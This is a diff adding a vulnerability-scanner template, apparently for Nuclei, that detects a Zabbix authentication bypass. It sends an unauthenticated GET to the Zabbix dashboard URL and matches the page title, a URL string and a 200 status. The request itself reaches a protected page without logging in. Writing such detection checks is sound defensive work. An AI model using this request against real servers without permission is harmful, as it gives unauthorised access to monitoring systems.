@@ -1,0 +1,31 @@
+id: zabbix-authentication-bypass
+
+info:
+  name: Zabbix - Authentication Bypass
+  author: qwtd
+  severity: high
+  description: Zabbix authentication bypass vulnerability.
+  reference:
+    - https://github.com/1120362990/vulnerability-list/blob/ef35be4029f4e7160e64d8339f9e43513a7fc40f/zabbix_vuln/Authentication_Bypass.py#L26
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-287
+  tags: ZABBIX-监控系统
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/zabbix/zabbix.php?action=dashboard.view&dashboardid=1"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "<title>(.*?)\\s*:\\s*Dashboard<\\/title>"
+      - type: word
+        words:
+          - "zabbix.php?action"
+      - type: status
+        status:
+          - 200
